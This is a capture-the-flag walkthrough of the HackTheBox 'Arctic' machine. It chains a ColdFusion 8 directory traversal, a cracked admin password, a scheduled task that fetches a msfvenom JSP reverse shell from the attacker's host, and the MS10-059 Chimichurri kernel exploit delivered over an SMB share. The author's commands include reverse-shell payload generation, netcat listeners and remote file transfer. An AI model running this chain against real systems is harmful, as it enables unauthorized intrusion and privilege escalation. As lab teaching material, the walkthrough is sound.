@@ -1,0 +1,124 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">Hack the Box Challenge: Arctic Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-challenge-arctic-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-03-31T15:58:47+00:00">March 31, 2018</time><time class="updated" datetime="2025-07-06T18:44:32+00:00">July 6, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Artic is a windows machine and is considered as easy by Hack the Box. This box has a directory traversal vulnerability which can be found in the Adobe-ColdFusion 8 version. We are going to exploit a unique kind of Directory Traversal vulnerability and obtain an encrypted password hash. After obtaining hash, we will crack it with the help of the online hash cracking site and log in to the content management system administrator dashboard. Once we log in to the dashboard then we will craft our java payload with the help of Msfvenom and upload it and get our initial foothold to the target machine. In addition, we are spawning system privileged shell using a kernel exploit.</span></p>
+<h3><span style="color: #800000;">Table of Content</span></h3>
+<p><span style="color: #000000;"><strong>Initial Access</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Port scan</span></li>
+<li><span style="color: #000000;">Enumeration</span></li>
+<li><span style="color: #000000;">Directory Traversal</span></li>
+<li><span style="color: #000000;">Hash crack</span></li>
+<li><span style="color: #000000;">Feature Abuse</span></li>
+<li><span style="color: #000000;">User flag</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Kernel Exploit MS10-059</span></li>
+<li><span style="color: #000000;">SMB File Transfer</span></li>
+<li><span style="color: #000000;">Root flag</span></li>
+</ul>
+<p><span style="color: #000000;">Let’s exploit it step by step.</span></p>
+<h3><span style="color: #800000;">Initial Access</span></h3>
+<p><span style="color: #000000;">We are going to start the assessment with port scanning.</span></p>
+<h4><span style="text-decoration: underline;"><span style="color: #000000;"><strong>Port Scan</strong></span></span></h4>
+<p><span style="color: #000000;">Let’s start with the port scan. We are using nmap to find out which ports are open so we can begin our port and service analyse. Nmap is a popular port scanning tool comes with Kali Linux. In order to perform port scan, we have used <strong>-sC</strong> and <strong>-sV</strong> flags.</span></p>
+<p><span style="color: #000000;">Flags features:</span></p>
+<p><span style="color: #000000;"><strong>-sC</strong>: Scans with default NSE scripts</span></p>
+<p><span style="color: #000000;"><strong>-sV</strong>:  Attempts to determine the service version</span></p>
+<p><span style="color: #000000;">Command used:</span></p>
+<p><span style="color: #000000;"><strong>nmap  -sC -sV 10.129.228.100</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgXQG0H7OWzAwn-c4nj7np7GZlrdB0xFzc5LaEGoqkkRwk2tF7uVpCLQ6hojFX1cU3IxIyOdZMBBBXUfvhum0PHL0mBkURSlSCuS2byeyx2reQg54W1dkNsvtgKCxERCmTAyYtm-8qdk1lx0xSbUp6Dme5RL3k3dNF8tl1kz-Ah0IEsDBQ19UizqMKxZg/s16000/1.png"/></span></p>
+<p><span style="color: #000000;">From the nmap scan, we have found there were 3 ports open which include port135,8500 and 49154. Port 135 and 49154 are used for the RPC Client-server communication and port 8500 is running a fmtp service. Out of these 3 ports, 8500 looks interesting.</span></p>
+<h4><span style="text-decoration: underline;"><span style="color: #000000;"><strong>Enumeration</strong></span></span></h4>
+<p><span style="color: #000000;">Let’s find out what <strong>fmtp</strong> protocol does. Flight message Transfer Protocol (fmtp) is a communication stack based on the transmission control and the internet protocols (TCP/IP). This protocol is used end to end communication exchange between flight data processing systems. Here we are going to begin our enumeration by accessing this port over the browser.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.129.228.100:8500</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhNuezG8ZozI29C-Hk2AjG1p5u8HG-PjqJ2pkX50TVc2RXFSECkVZ59adbcP8s-7UFjkpFYizZWiE13O15pWTZEQcOPHRT9cucZ9hdiczFWWzB0dGzjdpBYI2Sct7Q3j0DlLeCALcBx9bcpLzDla7-yVCwhlRaR7wT9miOCHm4vA_iUFlZ3XGs7Y5T2hQ/s16000/2.png"/></span></p>
+<p><span style="color: #000000;">When we access this port 8500 over the browser, we found a couple of interesting directories which might have some interesting things inside. Let’s check one of each directory. When we checked <strong>CFIDE</strong> directory, we found some other directories were there and out of them <strong>administrator</strong> directory looks interesting with the mindset of an attacker.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg6kbIhQq9Q6JvXOZGpxnPOfsLHPy0WacxI_JfN-8Md4u-zWvlf8eZ9uZOUjW-t2rAz1f3s2SoQa5hFpbCNfvCcYr87Q80fmAIwNRHay5EqnRt2QuF1BVuLWIRmm4hIiWjJqdIMrogD7-tyDRVACsvIAYyoUFodnI9L5e3GT5Lsysnua5H-UTwcX_2bXg/s16000/3.png"/></span></p>
+<p><span style="color: #000000;">Next, we decided to go with the administrator directory and found a login page. Additionally, we also found a Central Management System (CMS) called <strong>Adobe Cold Fusion version 8</strong>. Here, we are ready to search exploits and the vulnerable against the CMS with its version.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhtpBckB8mj00nxTSE9_aKNTvc2F0Hgx3Zrwnuq3Riovsh8Ba567Z26lz7rZYYHi0q7Oe9T-slLOSXpGdbMZql1A9LVo8ga7etwf5Q6IhLxPJN_u0GC3Pgno8ypDu4oniO9tnouXqFYM9_XCKdgo2Csu3sGiTYMZsypcgRi5SlDQq3uvGcGTodDpWZggA/s16000/4.png"/></span></p>
+<p><span style="text-decoration: underline;"><span style="color: #000000;"><strong>Directory Traversal</strong></span></span></p>
+<p><span style="color: #000000;">From a simple google search, we found an Exploit in the Exploit Database. After checking the exploit, we found that Adobe Cold Fusion 8 is vulnerable to Directory traversal and with this vulnerability we can obtain the administrator password hash. After following the exploit mentioned url path we got the hash of a user.</span></p>
+<p><span style="color: #000000;"><strong>Reference: <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.exploit-db.com/exploits/14641">https://www.exploit-db.com/exploits/14641</a></span></strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEggnPIJF52-5_tj9XEiRCNQfEzIOahhrkgUldmkY9wr9pRkNZ37HbQvIrzLpX2LqzG1E_mvEGISFf7czjuPMgNv1ajLh7QT4Vv9RjEKUT9SO_BbAekeULiGR483xzyK_spntXkw5UpUXcOXQkfu19puvOcIZGIN6Y2lQ4VGcG6l-Skj_JMZP8Q9FjrH_w/s16000/5.png"/></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjykqMh_pqr9fN9Omle-Gaw3LT6_x_cijFFmTaWSFOC2JMGb_O4-No-eOAeCesa6aXShrpzs6SDrX_cJ7tov4yjLTCfdMMe35Dz1VXKN78aS56Rhxubg3hWrVoyUGa_LrAgm2oGbdlDXuXIsT40sLh4mwSQLSnhrtMj2Mnb4s_avFbaltacp3wDz1IYBA/s16000/7.png"/></span></p>
+<p><span style="color: #000000;">If we see the above screenshot carefully there is a username <strong>admin</strong> in the user input field of the login page, here we are assuming that can be the user and now we have got hash which we can test with that user.</span></p>
+<h4><span style="text-decoration: underline;"><span style="color: #000000;"><strong>Hash Crack</strong></span></span></h4>
+<p><span style="color: #000000;">Let’s crack the hash using an online hash-cracking tool called <strong>Crackstation.</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiLmPKxY2DFyDthcL6RduDEsWs3EXybqdQPsN-zXw9EIMYCxQNsTWNLzJkWIao6n0490Ru0ee_Xx15nmbDCsfn5acWqrzXCiDwWkNhZi6t4SEArA38UPPQooT2CXQttoZx8sAvuKqpVz9-qULQ4CIciEjPwQ_68TBa0PuafJEJkiqOhzSpk9FHnRGB6ow/s16000/8.png"/></span></p>
+<p><span style="color: #000000;">As we have successfully cracked the hash and got a plain test password. We can try to login to the administrator console with user: <strong>admin</strong> and password:<strong> happyday</strong>.</span></p>
+<p><span style="color: #000000;"><strong>Reference: </strong> <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://crackstation.net/">https://crackstation.net/</a></strong></span></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEglJ-jVskfb5Q1OYM_N2V0UyNqyWpDVDdQB_CNwyfEL0erZFHEoFhSd_hNrLDpTgjHwit7pi6wATdZPigqtxvI62bX2qlvFeZbIyWRMKp4kr3Nkk5iM-qSIfYuOELeVX6kP7dvVUZ0OCljZV6E0MLypjFimiOwzv5DoKcPMdWh1NBq79ULmXi9LVF20kg/s16000/9.png"/></span></p>
+<h4><span style="text-decoration: underline;"><span style="color: #000000;"><strong>Feature Abuse</strong></span></span></h4>
+<p><span style="color: #000000;">After log in successfully to the administrator console, we decided to take our foothold to the target system. We will get our initial foothold by abusing the scheduling tasks feature. To do that, we need to navigate to the <strong>Scheduled Tasks</strong> and then select Schedule <strong>New Task</strong>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhQxh60tqkBj0hyp7HTw7j0Cf6815Zy8Gom62fpTAf5RWCjawCEViXsjzn1rewTEocVIPxyY_wraVjzANbz0UceM_PybX5IXSHYrvMs5RuzOD1oSjdceC9oDgg96N-QvpHlCdVHS9ObdxFnuX5YMVoecEHAAn40yGeHqS2TpfieMi4GFlTS2Ws-vtq1Gg/s16000/10.png"/></span></p>
+<p><span style="color: #000000;">When we click on the Scheduled Tasks, it will open a new window where we need to fill in information and upload the reverse shell. Scheduled feature will let us download a file from our server and execute it at the scheduled time.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgofMaOsUupJzuayPcpQBpkwK_p2x8Zbz6ok6RyafIVASAuC2XpQexZe06hndcTBXvhwwB-q9KcUEGC8qv8V7tpxP1SZKTEyner1B6dRz12JFxf8VDPLxikn7VpSzdxI8VBKDeDJGmRh56w0mSjK37F3BrOYs-0LefrrGKaqw4LYtnAJht2ZRQ96FTw6g/s16000/11.png"/></span></p>
+<p><span style="color: #000000;">Let’s create a payload. We need to create a <strong>jsp</strong> payload, here we are using msfvenom to create our payload named <strong>shell.jsp</strong> and turn on python server in the same directory where payload is stored.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.14.27 lport=4444 &gt; shell.jsp
+python -m SimpleHTTPServer 80</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgsWX6PlpN7xVSHeFwlI966tkbdbwLGZfzlgUXSvqI4mpUkzvxp3AtA1EMqfRyN7mPdZn2H5G3gPi5Lb7hCcTn2lyhaKXLQrlMzeZc-qaX2xkRP5iOYKh-ozgFSmawUm8ZmdDoXmR9Qacx_3HySpJYmdqGzLbPNioABIMnknCAmVm2lNrcC87X7fW0auw/s16000/12.png"/></span></p>
+<p><span style="color: #000000;">Then, we need to upload our shell.jsp payload in the administrator console under scheduled feature.</span></p>
+<p><span style="color: #000000;"><strong>Fill the following details in the form:</strong></span></p>
+<p><span style="color: #000000;"><strong>Task Name</strong>: revshell</span></p>
+<p><span style="color: #000000;"><strong>URL:</strong> Url to download file from.</span></p>
+<p><span style="color: #000000;">For <strong>example</strong> http://10.10.14.27/shell.jsp</span></p>
+<p><span style="color: #000000;"><strong>Publish:</strong> Enable check box to save the output locally</span></p>
+<p><span style="color: #000000;"><strong>File:</strong> Give path to store our payload (default path:  <strong>C:\ColdFusion8\wwwroot\CFIDE\</strong>).</span></p>
+<p><span style="color: #000000;">For<strong> example</strong> C:\ColdFusion8\wwwroot\CFIDE\shell.jsp</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiV5ecNmAdDP5o-LDpelJG9Br4v1SXXDbh14Gso6YsZQ91ozddKJP1017RYjxYBpMcEw1TZNvxUUQH46pkVv33A13n1L4dMnh2FKKmXGfgtnky_3-2Xt1erMvbL8t7Hwg7YKvAvKgTHeO8s1RczjbsOibcIrcQ6hjaKogrFtFnGpFMkHmi2KIr1wydt3Q/s16000/13.png"/></span></p>
+<p><span style="color: #000000;">In the above picture we can see that our payload is successfully uploaded to the target system.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgWhJ0QIIXj_N5DSCvPJ-vt9h5Fii-6tjkM8UYIGjoeC0ZKVX9ZNwTFMwes27RMqMOf53OwfKfq_HQ91C2J9PnmButPFJ9ArdEGgOBDBGdNzuoFxK4EctfqX6L1faF-HfpHPQEv5_OSMWNz8PnskBbRLjjaB_Rb-RlsMMpW8cSaECtggOob4BqXzgcfNQ/s16000/14.png"/></span></p>
+<p><span style="color: #000000;">Our payload can be accessible from below URL.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.129.228.100:8500/CFIDE/shell.jsp</pre>
+<h4><span style="text-decoration: underline;"><span style="color: #000000;"><strong>User Flag</strong></span></span></h4>
+<p><span style="color: #000000;">Firstly, let’s start Netcat listener on port 4444 and access the above url where our payload is accessible.</span></p>
+<p><span style="color: #000000;">Command used:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 4444</pre>
+<p><span style="color: #000000;">Here we go, we have successfully got reverse connection from the target machine.  Now, we can grab flag from the user <strong>tolis</strong> desktop directory.</span></p>
+<p><span style="color: #000000;">Command used:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd C:\\users
+dir
+cd tolis\Desktop
+dir
+type user.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjUubexMGFAIhgtDzalrYXFetiNxdVBP86GMiAOcRgEGMRkpDyGGJW228PyT78vX3Qp8HLDCKHWkNJtKq3zJpfehOVLL17whcTdhfauq09NwIgdMJzJzvSA2vburUv-xpghbiafCaSpYdMfhu5-0bfDeUpz3KgPsJ1IunvLQdu2XreCAaq-jbhuWYiqdg/s16000/16.png"/></span></p>
+<p><span style="color: #000000;">Or we can use alternative ways to all these commands at once as usually user flag is stored in the user’s desktop directory.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">type C:\users\tolis\Desktop\user.txt</pre>
+<h3><span style="color: #800000;">Privilege Escalation</span></h3>
+<p><span style="color: #000000;">Here we need to escalate to a privilege account in order to grab our root flag. The <strong>systeminfo </strong>command is used to enumerate the system version, build and architecture and many more which can give us an insight into any possible Kernel Exploits.</span></p>
+<p><span style="color: #000000;">Command used:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">systeminfo</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEinhVGB2zXLCAP0UvjR0logK8Wkswa93OUFCsR0cWHck6y7zbAr-tDYG8It_5GGJfmg0MlTg2pQQ8J0aP8Hiwn_PToaf1hsvoEE_uzNf6VcAG54_Mr5cAjscgLzVZPvvKGKiFJo4VZ15EZER0dQ9vnV7V84ZcnAvqVmL_9UZ8AXbsaX7_V__VWg_dRl1A/s16000/17.png"/></span></p>
+<h4><span style="text-decoration: underline;"><span style="color: #000000;"><strong>Kernel Exploit MS10-059</strong></span></span></h4>
+<p><span style="color: #000000;">After searching for the exploit on the basis of the system information we got to know that the target system kernel is vulnerable to <strong>MS10-059</strong>. Let’s search for that exploit in GitHub. A simple search took us to the GitHub repository with exploit name: <strong>Chimichurri.</strong></span></p>
+<h4><span style="color: #000000;"><strong><span style="text-decoration: underline;">SMB File Transfer</span> </strong></span></h4>
+<p><span style="color: #000000;">There are so many ways to transfer exploit to the target system, but we are using the Impacket tool to transfer exploit over smb. Let’s start smb server in the attacker machine.</span></p>
+<p><span style="color: #000000;">Command used:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-smbserver share $(pwd) -smb2support</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjbUUaIVY6HNokzeZ2x-1I8Tt0JO9LOqs9lVP2fN-w-HvrQhaLnT0274mqYjfwl8VPisnJ16V-hEGKzP7zMoF9h1u52faDNUHYjoflpnfVYMIIBSlq3UJumi9Vh7eNjwnpABEWcpCU7dxNvnQyxqN_n8vr1qRKGzmTGTa9keo_L8rv317MroAjnAv3xVg/s16000/18.png"/></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">copy \\10.10.14.27\share\Chimichurri.exe
+Chimichurri.exe 10.10.14.27 5555</pre>
+<p><span style="color: #000000;">Then, once we start smb server in the kali machine, we are good to download our exploit to the target machine via smb share. In the below picture, we are downloading <strong>Chimichurri.exe</strong>  to the target machine.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgZMK4GQa02G7okijNeKNXC0F5dE-zG0eMB_FUNJ8_fo1NIg7cJGT3_WQYUy6xvDR5pGgOAHfKfhz9Mnc5Rwm0O-cVBBS3Wn59hBGy--et9yTTN0bG1oFTw2HbRbeNp6Y1MkJSe0uzB8tt2CU2mhBp2CI6glyEimSBFgM7p7oYsAkTN9m0mRpe03T0TDA/s16000/23.png"/></span></p>
+<p><span style="color: #000000;">Now we need to set up a Netcat listener in our kali machine in order to catch reverse shell.</span></p>
+<h4><span style="text-decoration: underline;"><span style="color: #000000;"><strong>Root Flag</strong></span></span></h4>
+<p><span style="color: #000000;">After setting up a Netcat listener on port 5555, we will catch our reverse shell when it is executed from the target machine. Once we get a reverse connection from the target machine, we can confirm our current shell has privilege with <strong>whoami </strong>command. It is confirmed that we got high privileged shell and now we can grab root flag from the C:\Users\Administrator\Desktop directory.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 5555
+whoami
+cd C:\Users\Administrator\Desktop
+type root.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhgM7al4cmM_T3INAjKLyaf0mkxVLkHxSlLHYEnfI7Wrfqg4Xc2SnSj2tv2CS09q1wCdGbwdBo9Qnetm0u5IeYNCYy-xYnqgFjMe0gTnJv7dCguZUgKczGmcN0ByzW8PbJyq181PUa3SiwkygqrRLdLf7l00AEzPWlNXm2D6J7ScNK5FdUe7xXnnKyB9w/s16000/24.png"/></span></p>
+<h3><span style="color: #000000;"><span style="color: #800000;">Conclusion</span></span></h3>
+<p><span style="color: #000000;">This machine was fun and good from various perspectives, where we learned and explored so many things such as port scanning, service enumeration, CMS exploitation via directory traversal vulnerability, payload creation, hash crack, feature abuse, file transfer and the post-exploitation via kernel exploits.</span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. I hope you have enjoyed and learned something. Happy Hacking!</span></p>
+<p><strong>Author: </strong><span style="color: #000000;">Subhash Paudel is a Penetration Tester and a CTF player who has a keen interest in various technologies and loves to explore more and more. Additionally, he is a technical writer at Hacking articles. Contact here</span><strong>: <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://au.linkedin.com/in/subhash-paudel-a021ab207">Linkedin</a></span></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
